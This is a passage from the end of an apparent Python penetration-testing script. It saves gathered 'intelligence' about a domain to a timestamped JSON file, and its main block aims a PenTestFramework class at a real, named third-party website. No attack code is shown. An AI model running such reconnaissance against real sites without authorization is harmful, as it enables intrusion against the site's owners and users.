        filename = f"intelligence_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(self.intelligence, f, indent=2, default=str)
        self.log(f"\nIntelligence saved to: {filename}", "SUCCESS")


if __name__ == "__main__":
    target = "https://bestchange.com"
    framework = PenTestFramework(target)
    framework.run()
